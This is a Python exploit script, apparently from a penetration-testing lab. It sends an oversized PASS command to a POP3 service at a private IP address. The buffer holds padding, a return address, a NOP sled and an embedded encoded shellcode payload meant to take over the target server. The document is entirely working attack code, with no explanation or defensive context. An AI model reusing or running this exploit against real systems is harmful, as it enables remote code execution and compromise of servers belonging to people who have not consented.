#!/usr/bin/python 
import socket 
s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shellcode = ("\xda\xd8\xb8\x2e\x18\x68\xa6\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x43\x17\x83\xeb\xfc\x03\x6d\x0b\x8a\x53\x8d\xc3\xc8"
"\x9c\x6d\x14\xad\x15\x88\x25\xed\x42\xd9\x16\xdd\x01\x8f\x9a"
"\x96\x44\x3b\x28\xda\x40\x4c\x99\x51\xb7\x63\x1a\xc9\x8b\xe2"
"\x98\x10\xd8\xc4\xa1\xda\x2d\x05\xe5\x07\xdf\x57\xbe\x4c\x72"
"\x47\xcb\x19\x4f\xec\x87\x8c\xd7\x11\x5f\xae\xf6\x84\xeb\xe9"
"\xd8\x27\x3f\x82\x50\x3f\x5c\xaf\x2b\xb4\x96\x5b\xaa\x1c\xe7"
"\xa4\x01\x61\xc7\x56\x5b\xa6\xe0\x88\x2e\xde\x12\x34\x29\x25"
"\x68\xe2\xbc\xbd\xca\x61\x66\x19\xea\xa6\xf1\xea\xe0\x03\x75"
"\xb4\xe4\x92\x5a\xcf\x11\x1e\x5d\x1f\x90\x64\x7a\xbb\xf8\x3f"
"\xe3\x9a\xa4\xee\x1c\xfc\x06\x4e\xb9\x77\xaa\x9b\xb0\xda\xa3"
"\x68\xf9\xe4\x33\xe7\x8a\x97\x01\xa8\x20\x3f\x2a\x21\xef\xb8"
"\x4d\x18\x57\x56\xb0\xa3\xa8\x7f\x77\xf7\xf8\x17\x5e\x78\x93"
"\xe7\x5f\xad\x34\xb7\xcf\x1e\xf5\x67\xb0\xce\x9d\x6d\x3f\x30"
"\xbd\x8e\x95\x59\x54\x75\x7e\x6c\xa2\x75\xb0\x18\xb6\x75\x4d"
"\x62\x3f\x93\x27\x84\x16\x0c\xd0\x3d\x33\xc6\x41\xc1\xe9\xa3"
"\x42\x49\x1e\x54\x0c\xba\x6b\x46\xf9\x4a\x26\x34\xac\x55\x9c"
"\x50\x32\xc7\x7b\xa0\x3d\xf4\xd3\xf7\x6a\xca\x2d\x9d\x86\x75"
"\x84\x83\x5a\xe3\xef\x07\x81\xd0\xee\x86\x44\x6c\xd5\x98\x90"
"\x6d\x51\xcc\x4c\x38\x0f\xba\x2a\x92\xe1\x14\xe5\x49\xa8\xf0"
"\x70\xa2\x6b\x86\x7c\xef\x1d\x66\xcc\x46\x58\x99\xe1\x0e\x6c"
"\xe2\x1f\xaf\x93\x39\xa4\xdf\xd9\x63\x8d\x77\x84\xf6\x8f\x15"
"\x37\x2d\xd3\x23\xb4\xc7\xac\xd7\xa4\xa2\xa9\x9c\x62\x5f\xc0"
"\x8d\x06\x5f\x77\xad\x02")
buffer="A"*2606 +"\x8f\x35\x4a\x5f" + "\x90" *60 + shellcode +"C"*(3500-2606-4-351-60)


try:
	print "\nSending evil buffer..."
	s.connect(('10.11.22.76', 110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + 'r\n')
	print "\nDone!"
except:
	print "Could not connect to POP3!"

